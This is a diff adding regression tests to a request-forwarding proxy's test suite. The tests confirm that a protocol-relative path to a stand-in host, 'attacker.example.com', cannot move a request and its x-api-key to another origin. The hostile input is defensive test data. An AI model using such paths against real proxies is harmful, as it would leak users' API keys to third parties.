@@ -137,6 +137,36 @@ describe('forwardRequest', () => {
     expect(receivedUrl).toBe('/gateway/v1/models?limit=2');
   });
 
+  it('never lets a request path move the request to another origin', async () => {
+    // A protocol-relative target resolves to a whole different host under
+    // relative URL resolution. Anything that can reach the local port could
+    // otherwise use the proxy to post the user's x-api-key to a server of its
+    // choosing, so the upstream origin has to be pinned, not derived.
+    const response = await forwardRequest(
+      'POST',
+      '//attacker.example.com/v1/messages',
+      { 'x-api-key': 'test-key' },
+      '{}',
+      mockUpstreamUrl
+    );
+
+    expect(response.status).toBe(200);
+    expect(receivedUrl).toBe('/v1/messages');
+  });
+
+  it('keeps a pinned origin even when the upstream has a base path', async () => {
+    const response = await forwardRequest(
+      'POST',
+      '//attacker.example.com/v1/messages?x=1',
+      {},
+      '{}',
+      `${mockUpstreamUrl}/gateway`
+    );
+
+    expect(response.status).toBe(200);
+    expect(receivedUrl).toBe('/gateway/v1/messages?x=1');
+  });
+
   it('leaves the path untouched when the upstream URL is a bare origin', async () => {
     const response = await forwardRequest('POST', '/v1/messages', {}, '{}', `${mockUpstreamUrl}/`);
 
